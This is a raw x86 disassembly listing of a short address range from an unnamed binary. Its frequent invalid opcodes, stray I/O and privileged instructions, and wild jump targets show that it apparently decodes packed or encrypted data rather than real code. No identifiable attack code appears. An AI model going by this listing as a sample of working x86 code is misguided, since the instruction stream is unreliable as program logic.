  41428d:	92                   	xchg   %eax,%edx
  41428e:	6c                   	insb   (%dx),%es:(%edi)
  41428f:	74 48                	je     0x4142d9
  414291:	18 38                	sbb    %bh,(%eax)
  414293:	1f                   	pop    %ds
  414294:	98                   	cwtl
  414295:	9d                   	popf
  414296:	0d a0 57 1d ee       	or     $0xee1d57a0,%eax
  41429b:	6e                   	outsb  %ds:(%esi),(%dx)
  41429c:	75 41                	jne    0x4142df
  41429e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  41429f:	7b 63                	jnp    0x414304
  4142a1:	fc                   	cld
  4142a2:	c4                   	(bad)
  4142a3:	f8                   	clc
  4142a4:	32 1a                	xor    (%edx),%bl
  4142a6:	d2 dc                	rcr    %cl,%ah
  4142a8:	00 96 24 42 a0 49    	add    %dl,0x49a04224(%esi)
  4142ae:	f8                   	clc
  4142af:	42                   	inc    %edx
  4142b0:	42                   	inc    %edx
  4142b1:	9a 17 7b 48 f8 c6 96 	lcall  $0x96c6,$0xf8487b17
  4142b8:	ed                   	in     (%dx),%eax
  4142b9:	09 6f 54             	or     %ebp,0x54(%edi)
  4142bc:	10 6a 05             	adc    %ch,0x5(%edx)
  4142bf:	45                   	inc    %ebp
  4142c0:	f3 03 f4             	repz add %esp,%esi
  4142c3:	dd 1a                	fstpl  (%edx)
  4142c5:	fb                   	sti
  4142c6:	0c 78                	or     $0x78,%al
  4142c8:	12 50 94             	adc    -0x6c(%eax),%dl
  4142cb:	80 bd 20 00 63 db f8 	cmpb   $0xf8,-0x249cffe0(%ebp)
  4142d2:	6c                   	insb   (%dx),%es:(%edi)
  4142d3:	f2 af                	repnz scas %es:(%edi),%eax
  4142d5:	7d f3                	jge    0x4142ca
  4142d7:	f8                   	clc
  4142d8:	0a 05 ee 2c b3 c2    	or     0xc2b32cee,%al
  4142de:	65 a7                	cmpsl  %es:(%edi),%gs:(%esi)
  4142e0:	9f                   	lahf
  4142e1:	3d a0 bc 0d 95       	cmp    $0x950dbca0,%eax
  4142e6:	16                   	push   %ss
  4142e7:	16                   	push   %ss
  4142e8:	82 03 d5             	addb   $0xd5,(%ebx)
  4142eb:	4b                   	dec    %ebx
  4142ec:	74 2e                	je     0x41431c
  4142ee:	03 ef                	add    %edi,%ebp
  4142f0:	c3                   	ret
  4142f1:	3a 98 0f b8 f0 09    	cmp    0x9f0b80f(%eax),%bl
  4142f7:	74 6d                	je     0x414366
  4142f9:	43                   	inc    %ebx
  4142fa:	3c 38                	cmp    $0x38,%al
  4142fc:	b0 67                	mov    $0x67,%al
  4142fe:	df 74 1c ae          	fbstp  -0x52(%esp,%ebx,1)
  414302:	53                   	push   %ebx
  414303:	74 02                	je     0x414307
  414305:	6a 46                	push   $0x46
  414307:	80 ec 35             	sub    $0x35,%ah
  41430a:	de a6 bd 75 46 68    	fisubs 0x684675bd(%esi)
  414310:	f6 8e 25 06 d9 85 81 	testb  $0x81,-0x7a26f9db(%esi)
  414317:	20 72 f5             	and    %dh,-0xb(%edx)
  41431a:	00 23                	add    %ah,(%ebx)
  41431c:	bf c5 09 8d 7f       	mov    $0x7f8d09c5,%edi
  414321:	df 53 13             	fists  0x13(%ebx)
  414324:	74 77                	je     0x41439d
  414326:	61                   	popa
  414327:	72 65                	jb     0x41438e
  414329:	f8                   	clc
  41432a:	85 21                	test   %esp,(%ecx)
  41432c:	01 0b                	add    %ecx,(%ebx)
  41432e:	dd 63 61             	frstor 0x61(%ebx)
  414331:	6c                   	insb   (%dx),%es:(%edi)
  414332:	65 73 4d             	gs jae 0x414382
  414335:	02 52 76             	add    0x76(%edx),%dl
  414338:	d7                   	xlat   %ds:(%ebx)
  414339:	1b 27                	sbb    (%edi),%esp
  41433b:	9a c1 87 80 22 df 39 	lcall  $0x39df,$0x228087c1
  414342:	b0 0f                	mov    $0xf,%al
  414344:	07                   	pop    %es
  414345:	de 63 15             	fisubs 0x15(%ebx)
  414348:	aa                   	stos   %al,%es:(%edi)
  414349:	3b d8                	cmp    %eax,%ebx
  41434b:	b8 08 17 4f ef       	mov    $0xef4f1708,%eax
  414350:	83 32 4b             	xorl   $0x4b,(%edx)
  414353:	f8                   	clc
  414354:	14 d5                	adc    $0xd5,%al
  414356:	a3 09 23 da 3b       	mov    %eax,0x3bda2309
  41435b:	46                   	inc    %esi
  41435c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  41435d:	8b 35 0a a3 22 05    	mov    0x522a30a,%esi
  414363:	de 86 62 56 80 1b    	fiadds 0x1b805662(%esi)
  414369:	a1 0f 2d 48 40       	mov    0x40482d0f,%eax
  41436e:	7b 63                	jnp    0x4143d3
  414370:	21 ba 3b 9b 24 6b    	and    %edi,0x6b249b3b(%edx)
  414376:	8b ae 22 eb 74 6d    	mov    0x6d74eb22(%esi),%ebp
  41437c:	0a a8 19 6a b8 81    	or     -0x7e4795e7(%eax),%ch
  414382:	53                   	push   %ebx
  414383:	59                   	pop    %ecx
  414384:	04 2f                	add    $0x2f,%al
  414386:	14 5d                	adc    $0x5d,%al
  414388:	97                   	xchg   %eax,%edi
  414389:	69 60 0b 94 02 27 83 	imul   $0x83270294,0xb(%eax),%esp
  414390:	43                   	inc    %ebx
  414391:	36 eb 0c             	ss jmp 0x4143a0
  414394:	de d9                	fcompp
  414396:	2f                   	das
  414397:	8f                   	(bad)
  414398:	f8                   	clc
  414399:	30 58 3f             	xor    %bl,0x3f(%eax)
  41439c:	96                   	xchg   %eax,%esi
  41439d:	65 2b 14 f8          	sub    %gs:(%eax,%edi,8),%edx
  4143a1:	f8                   	clc
  4143a2:	39 44 6f 4a          	cmp    %eax,0x4a(%edi,%ebp,2)
  4143a6:	1b 86 a5 21 b6 f8    	sbb    -0x749de5b(%esi),%eax
  4143ac:	e3 b1                	jecxz  0x41435f
  4143ae:	04 d7                	add    $0xd7,%al
  4143b0:	20 87 45 b4 0a 1f    	and    %al,0x1f0ab445(%edi)
  4143b6:	0b 13                	or     (%ebx),%edx
  4143b8:	8a 87 35 1c 38 75    	mov    0x75381c35(%edi),%al
  4143be:	c7                   	(bad)
  4143bf:	30 77 f6             	xor    %dh,-0xa(%edi)
  4143c2:	be 59 c7 ce a3       	mov    $0xa3cec759,%esi
  4143c7:	06                   	push   %es
  4143c8:	6b 51 66 e4          	imul   $0xffffffe4,0x66(%ecx),%edx
  4143cc:	82 6c 28 1c 04       	subb   $0x4,0x1c(%eax,%ebp,1)
  4143d1:	4b                   	dec    %ebx
  4143d2:	55                   	push   %ebp
  4143d3:	21 b7 80 46 64 a5    	and    %esi,-0x5a9bb980(%edi)
  4143d9:	3a 30                	cmp    (%eax),%dh
  4143db:	16                   	push   %ss
  4143dc:	83 df e7             	sbb    $0xffffffe7,%edi
  4143df:	0b 4b 3b             	or     0x3b(%ebx),%ecx
  4143e2:	05 38 75 0c 1c       	add    $0x1c0c7538,%eax
  4143e7:	44                   	inc    %esp
  4143e8:	4b                   	dec    %ebx
  4143e9:	99                   	cltd
  4143ea:	e8 3d eb 1f a1       	call   0xa1612f2c
  4143ef:	06                   	push   %es
  4143f0:	82 29 3b             	subb   $0x3b,(%ecx)
  4143f3:	ee                   	out    %al,(%dx)
  4143f4:	81 ab 06 52 63 57 8d 	subl   $0xba3068d,0x57635206(%ebx)
  4143fb:	06 a3 0b 
  4143fe:	6a d3                	push   $0xffffffd3
  414400:	8f ea 8f c2          	(bad)
  414404:	05 4d cd 22 0b       	add    $0xb22cd4d,%eax
  414409:	6d                   	insl   (%dx),%es:(%edi)
  41440a:	fc                   	cld
  41440b:	96                   	xchg   %eax,%esi
  41440c:	32 fc                	xor    %ah,%bh
  41440e:	20 a6 74 3d 81 7b    	and    %ah,0x7b813d74(%esi)
  414414:	04 cc                	add    $0xcc,%al
  414416:	d9 2a                	fldcw  (%edx)
  414418:	45                   	inc    %ebp
  414419:	25 dc 4b 8b 43       	and    $0x438b4bdc,%eax
  41441e:	03 c0                	add    %eax,%eax
  414420:	ea 40 be fa d5 c4 50 	ljmp   $0x50c4,$0xd5fabe40
  414427:	8b 88 0a 26 0b f1    	mov    -0xef4d9f6(%eax),%ecx
  41442d:	eb 76                	jmp    0x4144a5
  41442f:	53                   	push   %ebx
  414430:	9c                   	pushf
  414431:	25 b0 4f 04 8d       	and    $0x8d044fb0,%eax
  414436:	42                   	inc    %edx
  414437:	09 21                	or     %esp,(%ecx)
  414439:	47                   	inc    %edi
  41443a:	52                   	push   %edx
  41443b:	24 bf                	and    $0xbf,%al
  41443d:	16                   	push   %ss
  41443e:	31 80 08 17 43 19    	xor    %eax,0x19431708(%eax)
  414444:	08 51 b8             	or     %dl,-0x48(%ecx)
  414447:	c2 86 63             	ret    $0x6386
  41444a:	13 04 59             	adc    (%ecx,%ebx,2),%eax
  41444d:	85 06                	test   %eax,(%esi)
  41444f:	51                   	push   %ecx
  414450:	7d 1e                	jge    0x414470
  414452:	74 a8                	je     0x4143fc
  414454:	96                   	xchg   %eax,%esi
  414455:	2a c7                	sub    %bh,%al
  414457:	33 b4 2b 6c b7 a8 5b 	xor    0x5ba8b76c(%ebx,%ebp,1),%esi
  41445e:	bd 50 10 bc 52       	mov    $0x52bc1050,%ebp
  414463:	8d 06                	lea    (%esi),%eax
  414465:	52                   	push   %edx
  414466:	a2 a9 ca 58 57       	mov    %al,0x5758caa9
  41446b:	14 48                	adc    $0x48,%al
  41446d:	e0 a1                	loopne 0x414410
  41446f:	03 b1 f0 49 01 c3    	add    -0x3cfeb610(%ecx),%esi
  414475:	38 23                	cmp    %ah,(%ebx)
  414477:	70 6b                	jo     0x4144e4
  414479:	cd 7d                	int    $0x7d
  41447b:	6d                   	insl   (%dx),%es:(%edi)
  41447c:	74 f3                	je     0x414471
  41447e:	c3                   	ret
  41447f:	0d 3e 2a 52 7e       	or     $0x7e522a3e,%eax
  414484:	1a e6                	sbb    %dh,%ah
  414486:	00 9a 6a f5 8d 51    	add    %bl,0x518df56a(%edx)
  41448c:	14 5c                	adc    $0x5c,%al
  41448e:	b3 06                	mov    $0x6,%bl
  414490:	f3 b0 32             	repz mov $0x32,%al
  414493:	01 08                	add    %ecx,(%eax)
  414495:	8f                   	(bad)
  414496:	59                   	pop    %ecx
  414497:	33 03                	xor    (%ebx),%eax
  414499:	0d 40 89 eb e7       	or     $0xe7eb8940,%eax
  41449e:	15 b0 66 68 d1       	adc    $0xd16866b0,%eax
  4144a3:	d9 3f                	fnstcw (%edi)
  4144a5:	4f                   	dec    %edi
  4144a6:	a8 48                	test   $0x48,%al
  4144a8:	75 01                	jne    0x4144ab
  4144aa:	18 c3                	sbb    %al,%bl
  4144ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4144ad:	ee                   	out    %al,(%dx)
  4144ae:	16                   	push   %ss
  4144af:	6c                   	insb   (%dx),%es:(%edi)
  4144b0:	bb 3d 46 0c 02       	mov    $0x20c463d,%ebx
  4144b5:	10 c2                	adc    %al,%dl
  4144b7:	2d b1 21 74 c3       	sub    $0xc37421b1,%eax
  4144bc:	f6 16                	notb   (%esi)
  4144be:	46                   	inc    %esi
  4144bf:	48                   	dec    %eax
  4144c0:	74 20                	je     0x4144e2
  4144c2:	02 2e                	add    (%esi),%ch
  4144c4:	2e 3d 7d b8 78 43    	cs cmp $0x4378b87d,%eax
  4144ca:	3c f1                	cmp    $0xf1,%al
  4144cc:	8e ba 76 b9 fd c7    	mov    -0x3802468a(%edx),%?
  4144d2:	46                   	inc    %esi
  4144d3:	1c a4                	sbb    $0xa4,%al
  4144d5:	e0 e4                	loopne 0x4144bb
  4144d7:	6b 64 80 b5 17       	imul   $0x17,-0x4b(%eax,%eax,4),%esp
  4144dc:	40                   	inc    %eax
  4144dd:	02 66 26             	add    0x26(%esi),%ah
  4144e0:	e4 7b                	in     $0x7b,%al
  4144e2:	bb 0f 28 c0 d3       	mov    $0xd3c0280f,%ebx
  4144e7:	06                   	push   %es
  4144e8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4144e9:	e9 ee f3 24 00       	jmp    0x6638dc
  4144ee:	4c                   	dec    %esp
  4144ef:	20 d0                	and    %dl,%al
  4144f1:	0d 80 7e 48 d1       	or     $0xd1487e80,%eax
  4144f6:	ae                   	scas   %es:(%edi),%al
  4144f7:	05 5c ed 5e 9a       	add    $0x9a5eed5c,%eax
  4144fc:	06                   	push   %es
  4144fd:	51                   	push   %ecx
  4144fe:	6a 0b                	push   $0xb
  414500:	ea 68 db be 82 48 d4 	ljmp   $0xd448,$0x82bedb68
  414507:	b0 d9                	mov    $0xd9,%al
  414509:	ff 1d eb e8 aa 5b    	lcall  *0x5baae8eb
  41450f:	7d 46                	jge    0x414557
  414511:	06                   	push   %es
  414512:	81 36 b3 d7 7a a3    	xorl   $0xa37ad7b3,(%esi)
  414518:	db ef                	fucomi %st(7),%st
  41451a:	b6 09                	mov    $0x9,%dh
  41451c:	20 4e 04             	and    %cl,0x4(%esi)
  41451f:	27                   	daa
  414520:	ff 36                	push   (%esi)
  414522:	23 c8                	and    %eax,%ecx
  414524:	40                   	inc    %eax
  414525:	21 c9                	and    %ecx,%ecx
  414527:	7d 99                	jge    0x4144c2
  414529:	e8 36 2d 81 04       	call   0x4c27264
  41452e:	73 15                	jae    0x414545
  414530:	8c 50 5c             	mov    %ss,0x5c(%eax)
  414533:	21 d6                	and    %edx,%esi
  414535:	9c                   	pushf
  414536:	1b f8                	sbb    %eax,%edi
  414538:	ad                   	lods   %ds:(%esi),%eax
  414539:	5b                   	pop    %ebx
  41453a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  41453b:	57                   	push   %edi
  41453c:	9f                   	lahf
  41453d:	35 14 c7 60 8d       	xor    $0x8d60c714,%eax
  414542:	96                   	xchg   %eax,%esi
  414543:	95                   	xchg   %eax,%ebp
  414544:	52                   	push   %edx
  414545:	20 e0                	and    %ah,%al
  414547:	5a                   	pop    %edx
  414548:	48                   	dec    %eax
  414549:	6f                   	outsl  %ds:(%esi),(%dx)
  41454a:	41                   	inc    %ecx
  41454b:	cd 6c                	int    $0x6c
  41454d:	50                   	push   %eax
  41454e:	8b 36                	mov    (%esi),%esi
  414550:	36 4c                	ss dec %esp
  414552:	80 bc 3e b5 16 be 06 	cmpb   $0x1c,0x6be16b5(%esi,%edi,1)
  414559:	1c 
  41455a:	1a 5a 40             	sbb    0x40(%edx),%bl
  41455d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  41455e:	d5 2b                	aad    $0x2b
  414560:	c2 85 b3             	ret    $0xb385
  414563:	06                   	push   %es
  414564:	c9                   	leave
  414565:	49                   	dec    %ecx
  414566:	1d 09 f0 29 db       	sbb    $0xdb29f009,%eax
  41456b:	a1 7b ee 5d eb       	mov    0xeb5dee7b,%eax
  414570:	22 c5                	and    %ch,%al
  414572:	be 94 b2 1f 8d       	mov    $0x8d1fb294,%esi
  414577:	f6 21                	mulb   (%ecx)
  414579:	b6 f9                	mov    $0xf9,%dh
  41457b:	b6 eb                	mov    $0xeb,%dh
  41457d:	2e f5                	cs cmc
  41457f:	b3 d0                	mov    $0xd0,%bl
  414581:	74 3b                	je     0x4145be
  414583:	af                   	scas   %es:(%edi),%eax
  414584:	3a b5 3d 30 1b 17    	cmp    0x171b303d(%ebp),%dh
  41458a:	36 87 10             	xchg   %edx,%ss:(%eax)
  41458d:	1a 02                	sbb    (%edx),%al
  41458f:	6d                   	insl   (%dx),%es:(%edi)
  414590:	54                   	push   %esp
  414591:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  414592:	6b 61 f9 d3          	imul   $0xffffffd3,-0x7(%ecx),%esp
  414596:	9f                   	lahf
  414597:	c3                   	ret
  414598:	3d 1c a1 9d 1a       	cmp    $0x1a9da11c,%eax
  41459d:	a8 11                	test   $0x11,%al
  41459f:	87 b8 69 36 e9 0b    	xchg   %edi,0xbe93669(%eax)
  4145a5:	ef                   	out    %eax,(%dx)
  4145a6:	13 82 0d a5 db 8d    	adc    -0x72245af3(%edx),%eax
  4145ac:	88 91 ce 14 bc 2d    	mov    %dl,0x2dbc14ce(%ecx)
  4145b2:	08 0d d3 08 b0 06    	or     %cl,0x6b008d3
  4145b8:	08 c9                	or     %cl,%cl
  4145ba:	5b                   	pop    %ebx
  4145bb:	f3 6d                	rep insl (%dx),%es:(%edi)
  4145bd:	33 e3                	xor    %ebx,%esp
  4145bf:	02 10                	add    (%eax),%dl
  4145c1:	0c 18                	or     $0x18,%al
  4145c3:	18 4c 40 1c          	sbb    %cl,0x1c(%eax,%eax,2)
  4145c7:	02 20                	add    (%eax),%ah
  4145c9:	fe                   	(bad)
  4145ca:	77 6c                	ja     0x414638
  4145cc:	2c 24                	sub    $0x24,%al
  4145ce:	59                   	pop    %ecx
  4145cf:	48                   	dec    %eax
  4145d0:	55                   	push   %ebp
  4145d1:	1b b5 82 8a 0a 42    	sbb    0x420a8a82(%ebp),%esi
  4145d7:	88 08                	mov    %cl,(%eax)
  4145d9:	40                   	inc    %eax
  4145da:	84 51 fd             	test   %dl,-0x3(%ecx)
  4145dd:	27                   	daa
  4145de:	5b                   	pop    %ebx
  4145df:	11 09                	adc    %ecx,(%ecx)
  4145e1:	07                   	pop    %es
  4145e2:	fe cd                	dec    %ch
  4145e4:	75 e8                	jne    0x4145ce
  4145e6:	48                   	dec    %eax
  4145e7:	88 28                	mov    %ch,(%eax)
  4145e9:	46                   	inc    %esi
  4145ea:	a3 57 c2 fb 22       	mov    %eax,0x22fbc257
  4145ef:	b9 7c 6f dc 63       	mov    $0x63dc6f7c,%ecx
  4145f4:	6d                   	insl   (%dx),%es:(%edi)
  4145f5:	d3 1c 0a             	rcrl   %cl,(%edx,%ecx,1)
  4145f8:	0e                   	push   %cs
  4145f9:	c3                   	ret
  4145fa:	0f ae                	(bad)
  4145fc:	f7 b8 67 5a 21 13    	idivl  0x13215a67(%eax)
  414602:	76 22                	jbe    0x414626
  414604:	8a 24 20             	mov    (%eax,%eiz,1),%ah
  414607:	5e                   	pop    %esi
  414608:	d3 58 1d             	rcrl   %cl,0x1d(%eax)
  41460b:	c0 4f f2 95          	rorb   $0x95,-0xe(%edi)
  41460f:	2d 2b 82 0c 1b       	sub    $0x1b0c822b,%eax
  414614:	de e2                	fsubp  %st,%st(2)
  414616:	01 77 48             	add    %esi,0x48(%edi)
  414619:	c4 8b c4 85 1b 3f    	les    0x3f1b85c4(%ebx),%ecx
  41461f:	c6                   	(bad)
  414620:	5f                   	pop    %edi
  414621:	5d                   	pop    %ebp
  414622:	f7 e1                	mul    %ecx
  414624:	50                   	push   %eax
  414625:	56                   	push   %esi
  414626:	ff 33                	push   (%ebx)
  414628:	7f 48                	jg     0x414672
  41462a:	58                   	pop    %eax
  41462b:	59                   	pop    %ecx
  41462c:	75 1f                	jne    0x41464d
  41462e:	d1 f7                	shl    $1,%edi
  414630:	56                   	push   %esi
  414631:	73 b8                	jae    0x4145eb
  414633:	a8 73                	test   $0x73,%al
  414635:	d9 a7 8e 69 d8 d7    	fldenv -0x28279672(%edi)
  41463b:	fd                   	std
  41463c:	82 0f 3b             	orb    $0x3b,(%edi)
  41463f:	c1 51 65 fc          	rcll   $0xfc,0x65(%ecx)
  414643:	05 f5 15 5b 22       	add    $0x225b15f5,%eax
  414648:	de e8                	fsubrp %st,%st(0)
  41464a:	58                   	pop    %eax
  41464b:	84 e2                	test   %ah,%dl
  41464d:	66 fe                	data16 (bad)
  41464f:	d8 f7                	fdiv   %st(7),%st
  414651:	32 ac f7 8d ea 7d 0e 	xor    0xe7dea8d(%edi,%esi,8),%ch
  414658:	83 fa 02             	cmp    $0x2,%edx
  41465b:	77 19                	ja     0x414676
  41465d:	75 17                	jne    0x414676
  41465f:	1a cd                	sbb    %ch,%cl
  414661:	b7 5c                	mov    $0x5c,%bh
  414663:	44                   	inc    %esp
  414664:	53                   	push   %ebx
  414665:	24 08                	and    $0x8,%al
  414667:	02 b6 b1 11 2b 6a    	add    0x6a2b11b1(%esi),%dh
  41466d:	36 d7                	xlat   %ss:(%ebx)
  41466f:	3d 51 41 24 74       	cmp    $0x74244151,%eax
  414674:	84 cb                	test   %cl,%bl
  414676:	d9 f0                	f2xm1
  414678:	3b eb                	cmp    %ebx,%ebp
  41467a:	81 78 88 75 18 74 c4 	cmpl   $0xc4741875,-0x78(%eax)
  414681:	bf d4 1c 3b 46       	mov    $0x463b1cd4,%edi
  414686:	73 10                	jae    0x414698
  414688:	03 50 14             	add    0x14(%eax),%edx
  41468b:	b0 00                	mov    $0x0,%al
  41468d:	5e                   	pop    %esi
  41468e:	1a db                	sbb    %bl,%bl
  414690:	9f                   	lahf
  414691:	e0 50                	loopne 0x4146e3
  414693:	5e                   	pop    %esi
  414694:	0d 3f 58 5a 3c       	or     $0x3c5a583f,%eax
  414699:	0e                   	push   %cs
  41469a:	f2 5f                	repnz pop %edi
  41469c:	90                   	nop
  41469d:	b3 ed                	mov    $0xed,%bl
  41469f:	ff 4a 0c             	decl   0xc(%edx)
  4146a2:	1a c3                	sbb    %bl,%al
  4146a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4146a5:	53                   	push   %ebx
  4146a6:	6d                   	insl   (%dx),%es:(%edi)
  4146a7:	1f                   	pop    %ds
  4146a8:	8b 3d 0f 1d 6d 33    	mov    0x336d1d0f,%edi
  4146ae:	dd c8                	(bad)
  4146b0:	07                   	pop    %es
  4146b1:	c4 70 7d             	les    0x7d(%eax),%esi
  4146b4:	be d8 3f 88 83       	mov    $0x83883fd8,%esi
  4146b9:	c8 ff eb f4          	enter  $0xebff,$0xf4
  4146bd:	6c                   	insb   (%dx),%es:(%edi)
  4146be:	0e                   	push   %cs
  4146bf:	78 e5                	js     0x4146a6
  4146c1:	90                   	nop
  4146c2:	0b c1                	or     %ecx,%eax
  4146c4:	20 87 73 1a 3b ea    	and    %al,-0x15c4e58d(%edi)
  4146ca:	8a fb                	mov    %bl,%bh
  4146cc:	ec                   	in     (%dx),%al
  4146cd:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4146ce:	df 0c 11             	fisttps (%ecx,%edx,1)
  4146d1:	72 04                	jb     0x4146d7
  4146d3:	42                   	inc    %edx
  4146d4:	cf                   	iret
  4146d5:	8a c1                	mov    %cl,%al
  4146d7:	c3                   	ret
  4146d8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4146d9:	0d b8 68 39 07       	or     $0x73968b8,%eax
  4146de:	7b 7f                	jnp    0x41475f
  4146e0:	0f b0 1a             	cmpxchg %bl,(%edx)
  4146e3:	50                   	push   %eax
  4146e4:	40                   	inc    %eax
  4146e5:	c7 b8 18 40 74       	xbegin 0x74815fa2,(bad)
  4146ea:	bf ba 79 f6 ec       	mov    $0xecf679ba,%edi
  4146ef:	eb de                	jmp    0x4146cf
  4146f1:	50                   	push   %eax
  4146f2:	e9 16 58 4b 72       	jmp    0x728c9f0d
  4146f7:	b4 c6                	mov    $0xc6,%ah
  4146f9:	04 11                	add    $0x11,%al
  4146fb:	ef                   	out    %eax,(%dx)
  4146fc:	ee                   	out    %al,(%dx)
  4146fd:	7b b7                	jnp    0x4146b6
  4146ff:	69 40 10 32 3a 58 08 	imul   $0x8583a32,0x10(%eax),%eax
  414706:	90                   	nop
  414707:	52                   	push   %edx
  414708:	42                   	inc    %edx
  414709:	c7                   	(bad)
  41470a:	9d                   	popf
  41470b:	68 9b fd e3 5a       	push   $0x5ae3fd9b
  414710:	88 0a                	mov    %cl,(%edx)
  414712:	c3                   	ret
  414713:	52                   	push   %edx
  414714:	09 25 0a 56 e6 5a    	or     %esp,0x5ae6560a
  41471a:	c0 50 a1 d7          	rclb   $0xd7,-0x5f(%eax)
  41471e:	fa                   	cli
  41471f:	d0 94 2f 01 1b 35 48 	rclb   $1,0x48351b01(%edi,%ebp,1)
  414726:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  414727:	26 5c                	es pop %esp
  414729:	8b 4b 10             	mov    0x10(%ebx),%ecx
  41472c:	7c eb                	jl     0x414719
  41472e:	ee                   	out    %al,(%dx)
  41472f:	ff 2b                	ljmp   *(%ebx)
  414731:	ca 03 53             	lret   $0x5303
  414734:	14 49                	adc    $0x49,%al
  414736:	7c 1f                	jl     0x414757
  414738:	8a 02                	mov    (%edx),%al
  41473a:	42                   	inc    %edx
  41473b:	fe                   	(bad)
  41473c:	11 3c 0d 82 aa 4e 7f 	adc    %edi,0x7f4eaa82(,%ecx,1)
  414743:	ee                   	out    %al,(%dx)
  414744:	bd 55 b5 4b 47       	mov    $0x474bb555,%ebp
  414749:	4a                   	dec    %edx
  41474a:	2b 17                	sub    (%edi),%edx
  41474c:	2c 59                	sub    $0x59,%al
  41474e:	2b ce                	sub    %esi,%ecx
  414750:	60                   	pusha
  414751:	11 ba 43 21 2c c3    	adc    %edi,-0x3cd3debd(%edx)
  414757:	25 36 62 2f 39       	and    $0x392f6236,%eax
  41475c:	3b eb                	cmp    %ebx,%ebp
  41475e:	cd c2                	int    $0xc2
  414760:	0c eb                	or     $0xeb,%al
  414762:	cf                   	iret
  414763:	c1 d9 c1             	rcr    $0xc1,%ecx
  414766:	f5                   	cmc
  414767:	c1 68 74 97          	shrl   $0x97,0x74(%eax)
  41476b:	eb e4                	jmp    0x414751
  41476d:	e7 4b                	out    %eax,$0x4b
  41476f:	3c 0a                	cmp    $0xa,%al
  414771:	87 5d ba             	xchg   %ebx,-0x46(%ebp)
  414774:	62 18                	bound  %ebx,(%eax)
  414776:	75 f1                	jne    0x414769
  414778:	0e                   	push   %cs
  414779:	0a 49 07             	or     0x7(%ecx),%cl
  41477c:	d0 96 ea 12 05 00    	rclb   $1,0x512ea(%esi)
  414782:	0c 62                	or     $0x62,%al
  414784:	6f                   	outsl  %ds:(%esi),(%dx)
  414785:	f2 34 6c             	repnz xor $0x6c,%al
  414788:	c4                   	(bad)
  414789:	f0 0b 56 e6          	lock or -0x1a(%esi),%edx
  41478d:	b0 0a                	mov    $0xa,%al
  41478f:	a9 0b ec ca 03       	test   $0x3caec0b,%eax
  414794:	29 3e                	sub    %edi,(%esi)
  414796:	a8 57                	test   $0x57,%al
  414798:	89 5e b9             	mov    %ebx,-0x47(%esi)
  41479b:	6c                   	insb   (%dx),%es:(%edi)
  41479c:	f7 1e                	negl   (%esi)
  41479e:	70 56                	jo     0x4147f6
  4147a0:	18 fa                	sbb    %bh,%dl
  4147a2:	68 93 b8 66 75       	push   $0x7566b893
  4147a7:	7b fe                	jnp    0x4147a7
  4147a9:	fe                   	(bad)
  4147aa:	9d                   	popf
  4147ab:	f1                   	int1
  4147ac:	ba 6e eb be ba       	mov    $0xbabeeb6e,%edx
  4147b1:	b2 06                	mov    $0x6,%dl
  4147b3:	b7 ba                	mov    $0xba,%bh
  4147b5:	b3 b0                	mov    $0xb0,%bl
  4147b7:	f8                   	clc
  4147b8:	e6 ec                	out    %al,$0xec
  4147ba:	30 86 98 f9 c9 52    	xor    %al,0x52c9f998(%esi)
  4147c0:	15 87 3d 4c c1       	adc    $0xc14c3d87,%eax
  4147c5:	0f 87 1b 34 4c c7    	ja     0xc78d7be6
  4147cb:	eb cd                	jmp    0x41479a
  4147cd:	01 af 43 59 fd 09    	add    %ebp,0x9fd5943(%edi)
  4147d3:	24 02                	and    $0x2,%al
  4147d5:	52                   	push   %edx
  4147d6:	9b                   	fwait
  4147d7:	58                   	pop    %eax
  4147d8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4147d9:	d2 bc 43 1c 8b 51 7b 	sarb   %cl,0x7b518b1c(%ebx,%eax,2)
  4147e0:	f5                   	cmc
  4147e1:	c5 dc 0b             	(bad)
  4147e4:	75 f7                	jne    0x4147dd
  4147e6:	8a 15 42 ea 83 e2    	mov    0xe283ea42,%dl
  4147ec:	70 a8                	jo     0x414796
  4147ee:	8b 92 c1 1c 95 c6    	mov    -0x396ae33f(%edx),%edx
  4147f4:	fa                   	cli
  4147f5:	b1 e3                	mov    $0xe3,%cl
  4147f7:	83 ef 03             	sub    $0x3,%edi
  4147fa:	74 23                	je     0x41481f
  4147fc:	dc 47 71             	faddl  0x71(%edi)
  4147ff:	04 c6                	add    $0xc6,%al
  414801:	72 63                	jb     0x414866
  414803:	ff 47 4c             	incl   0x4c(%edi)
  414806:	11 0c 26             	adc    %ecx,(%esi,%eiz,1)
  414809:	c9                   	leave
  41480a:	84 f5                	test   %dh,%ch
  41480c:	5c                   	pop    %esp
  41480d:	0d 9a db 43 3b       	or     $0x3b43db9a,%eax
  414812:	70 00                	jo     0x414814
  414814:	78 74                	js     0x41488a
  414816:	29 0b                	sub    %ecx,(%ebx)
  414818:	ba 7a 27 ac 16       	mov    $0x16ac277a,%edx
  41481d:	9f                   	lahf
  41481e:	73 83                	jae    0x4147a3
  414820:	c5 4c eb d9          	lds    -0x27(%ebx,%ebp,8),%ecx
  414824:	67 4b                	addr16 dec %ebx
  414826:	de 7a e7             	fidivrs -0x19(%edx)
  414829:	15 0c c7 43 f5       	adc    $0xf543c70c,%eax
  41482e:	c6                   	(bad)
  41482f:	7b 41                	jnp    0x414872
  414831:	08 78 77             	or     %bh,0x77(%eax)
  414834:	36 8d 0f             	lea    %ss:(%edi),%ecx
  414837:	fc                   	cld
  414838:	dd 5a 36             	fstpl  0x36(%edx)
  41483b:	00 31                	add    %dh,(%ecx)
  41483d:	8a 0d b6 80 e1 03    	mov    0x3e180b6,%cl
  414843:	8b ed                	mov    %ebp,%ebp
  414845:	a0 6f 78 02 76       	mov    0x7602786f,%al
  41484a:	02 b1 2f 40 dc af    	add    -0x5023bfd1(%ecx),%dh
  414850:	09 5c 20 64          	or     %ebx,0x64(%eax,%eiz,1)
  414854:	10 01                	adc    %al,(%ecx)
  414856:	09 75 d4             	or     %esi,-0x2c(%ebp)
